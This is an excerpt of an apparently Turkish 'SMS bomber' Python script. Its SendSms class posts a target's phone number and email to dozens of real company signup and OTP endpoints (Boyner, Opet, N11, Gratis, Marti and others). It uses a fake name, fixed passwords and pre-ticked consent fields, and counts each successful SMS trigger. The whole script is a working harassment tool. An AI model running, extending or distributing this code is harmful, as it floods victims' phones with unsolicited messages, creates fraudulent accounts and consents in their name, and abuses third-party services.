...
class SendSms():
    ...
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})#yıldırımlord#4444
    ...
    def Englishhome(self):
        try:
            data = {"first_name": "Berke", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
    ...
    def Sakasu(self):
        try:
            ...
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")#yıldırımlord#4444
                self.adet += 1
            else:
                raise
        except:
    ...
    #yaanimail.com  #yıldırımlord#4444
    def Yaani(self):
        try:
    ...
    def Boyner(self):
        try:
            ...
            json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": self.phone, "day": "31", "Email": self.mail, "FirstName": "Berke", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com")
                self.adet += 1 #yıldırımlord#4444
            else:
                raise
        except:
    ...
    def IkinciYeni(self):
        try:
            ...
            json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Berke", "phone": self.phone}
            r = requests.post(url, json=json)
    ...
    def Terra(self):
        try:
            ...
            json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Berke", "phone": str(self.phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
            r = requests.post(url,  json=json)
            if (r.status_code) == 201:
    ...
    def Mogaz(self):#yıldırımlord#4444
        try:
            ...
            json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Berke", "password": "", "phone": self.phone, "productType": 1, "subscription": True, "surname": "Bas"}
            r = requests.post(url, json=json)
            ...
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")#yıldırımlord#4444
    ...
    #petrolofisi.com.tr
    def PetrolOfisi(self):#yıldırımlord#4444
        try:
            ...
            json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{self.phone}", "name": "Berke", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
    ...
    def Opet(self):
        try:
            ...
            json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Berke", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(self.phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr")
                self.adet += 1
            else:
                raise    #yıldırımlord#4444
        except:
    ...
    #tazi.tech
    def Tazi(self): #yıldırımlord#4444
        try:
    ...
    def N11(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:      #yıldırımlord#4444
    ...
    def Joker(self):
        try:
            ...
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr")           #yıldırımlord#4444
    ...
    def Ebebek(self):
        try:
            ...
            json={"email": self.mail, "emailAllow": False, "firstName": "Berke", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
            r = requests.post(url, headers=headers, json=json)
    ...
    def Gofody(self):
        try:
            url = "https://backend.gofody.com:443/api/v1/enduser/register/"                 #yıldırımlord#4444
    ...
    #gratis.com
    def Gratis(self):             #yıldırımlord#4444
        try:
            ...
            json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Berke", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": self.phone, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
            r = requests.post(url, headers=headers, json=json)
            if (r.status_code) == 200:
    ...
    def Anadolu(self):
        try:
            url = f"https://www.anadolu.com.tr:443/mobil/OneriSms2.php?Numara={self.phone}&NAME=Berke%20Bas"
            r = requests.get(url)
            if r.status_code == 200:
    ...
    def Accordors(self):
        try:
            ...
            json={"apiVersion": "0.1.0", "id": "", "method": "members.new", "params": {"email": self.mail, "firstname": "Berke", "gender": "male", "identityno": "00000000001", "lastname": "Bas", "password": "31ABC..abc31", "phone": self.phone}}
            r = requests.post(url, json=json)
            if r.json()["data"]:
    ...
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"         #yıldırımlord#4444
